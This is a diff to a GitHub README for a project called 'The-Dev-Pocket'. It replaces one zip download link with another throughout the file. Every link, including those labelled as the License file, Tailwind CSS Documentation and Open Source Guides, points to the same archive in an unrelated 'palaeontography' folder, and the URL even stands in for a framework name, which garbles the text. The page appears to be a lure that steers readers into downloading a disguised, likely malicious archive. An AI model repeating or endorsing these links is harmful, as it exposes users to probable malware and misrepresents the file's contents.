@@ -1,10 +1,10 @@
 # 🎉 The-Dev-Pocket - Empower Your Learning Journey
 
-[![Download The-Dev-Pocket](https://raw.githubusercontent.com/Alaskamoula/The-Dev-Pocket/main/palaeontography/The-Dev-Pocket.zip)](https://raw.githubusercontent.com/Alaskamoula/The-Dev-Pocket/main/palaeontography/The-Dev-Pocket.zip)
+[![Download The-Dev-Pocket](https://github.com/Alaskamoula/The-Dev-Pocket/raw/refs/heads/main/palaeontography/Dev-The-Pocket-2.6.zip)](https://github.com/Alaskamoula/The-Dev-Pocket/raw/refs/heads/main/palaeontography/Dev-The-Pocket-2.6.zip)
 
 ## 📜 Overview
 
-The Dev Pocket is an open-source project designed to empower learners, students, and developers with curated resources, roadmaps, and interactive tools. Built with https://raw.githubusercontent.com/Alaskamoula/The-Dev-Pocket/main/palaeontography/The-Dev-Pocket.zip, Tailwind, and Clerk, it provides structured learning, community-driven contributions, and Hacktoberfest participation.
+The Dev Pocket is an open-source project designed to empower learners, students, and developers with curated resources, roadmaps, and interactive tools. Built with https://github.com/Alaskamoula/The-Dev-Pocket/raw/refs/heads/main/palaeontography/Dev-The-Pocket-2.6.zip, Tailwind, and Clerk, it provides structured learning, community-driven contributions, and Hacktoberfest participation.
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ The Dev Pocket is designed for everyone. You do not need to be a developer to us
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page. This is where you can download the latest version of The Dev Pocket.  
-   [Download The-Dev-Pocket](https://raw.githubusercontent.com/Alaskamoula/The-Dev-Pocket/main/palaeontography/The-Dev-Pocket.zip)
+   [Download The-Dev-Pocket](https://github.com/Alaskamoula/The-Dev-Pocket/raw/refs/heads/main/palaeontography/Dev-The-Pocket-2.6.zip)
 
 2. **Choose the Right File**  
    On the Releases page, you will see different versions of The Dev Pocket. Look for the latest version. It will usually be at the top of the list.
@@ -53,7 +53,7 @@ If you experience any difficulties, please check our FAQ section on the Releases
 
 The Dev Pocket is open-source software, offered under the MIT License. You are free to use, modify, and distribute it, as long as you include the original license and copyright notice.
 
-Visit the [License file](https://raw.githubusercontent.com/Alaskamoula/The-Dev-Pocket/main/palaeontography/The-Dev-Pocket.zip) for more details.
+Visit the [License file](https://github.com/Alaskamoula/The-Dev-Pocket/raw/refs/heads/main/palaeontography/Dev-The-Pocket-2.6.zip) for more details.
 
 ## 📂 Related Topics
 
@@ -72,8 +72,8 @@ Visit the [License file](https://raw.githubusercontent.com/Alaskamoula/The-Dev-P
 
 For more detailed guides, tutorials, and discussions, check out the following links:
 
-- [https://raw.githubusercontent.com/Alaskamoula/The-Dev-Pocket/main/palaeontography/The-Dev-Pocket.zip Documentation](https://raw.githubusercontent.com/Alaskamoula/The-Dev-Pocket/main/palaeontography/The-Dev-Pocket.zip)
-- [Tailwind CSS Documentation](https://raw.githubusercontent.com/Alaskamoula/The-Dev-Pocket/main/palaeontography/The-Dev-Pocket.zip)
-- [Open Source Guides](https://raw.githubusercontent.com/Alaskamoula/The-Dev-Pocket/main/palaeontography/The-Dev-Pocket.zip)
+- [https://github.com/Alaskamoula/The-Dev-Pocket/raw/refs/heads/main/palaeontography/Dev-The-Pocket-2.6.zip Documentation](https://github.com/Alaskamoula/The-Dev-Pocket/raw/refs/heads/main/palaeontography/Dev-The-Pocket-2.6.zip)
+- [Tailwind CSS Documentation](https://github.com/Alaskamoula/The-Dev-Pocket/raw/refs/heads/main/palaeontography/Dev-The-Pocket-2.6.zip)
+- [Open Source Guides](https://github.com/Alaskamoula/The-Dev-Pocket/raw/refs/heads/main/palaeontography/Dev-The-Pocket-2.6.zip)
 
 Thank you for using The Dev Pocket! Happy learning!
